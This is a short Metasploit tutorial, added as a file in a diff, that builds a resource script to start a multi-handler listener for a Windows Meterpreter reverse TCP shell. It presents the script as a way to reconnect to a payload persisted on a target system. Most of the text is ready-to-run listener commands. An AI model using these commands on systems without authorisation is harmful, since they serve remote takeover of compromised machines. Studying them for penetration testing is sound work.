@@ -1,0 +1,42 @@
+                                              [ RC / ERB scripting lesson 3 ]
+
+
+
+
+                                                   exercise description:
+                           "Lets create a resource file to start a multi-handler (listenner) for us".
+                    This exercise is useful for when we "persist" a payload in target system, and days later we
+                    want to start a listenner to reconnect back but dont remmenber the settings enter that day.
+                             "this is a good way to store settings or for automating frameworks".
+
+
+
+
+
+
+                    1º build 'listenner.rc' resource file:
+                    "open text editor and copy/paste"
+                    -------------------------------------
+                    use exploit/multi/handler
+                    set PAYLOAD windows/meterpreter/reverse_tcp
+                    set LPORT 666
+                    set LHOST 192.168.1.68
+                    set ExitOnSession false
+                    exploit -j -z
+
+
+                    2º run resource file
+                    --------------------
+                    msfconsole -r listenner.rc
+                    "OR: msfconsole -r /root/listenner.rc"
+                    "OR: msf > resouce listenner.rc"
+
+
+                    3º clean things up in the end:
+                    ------------------------------
+                    msf exploit(handler) > exit
+
+
+
+
+EOF
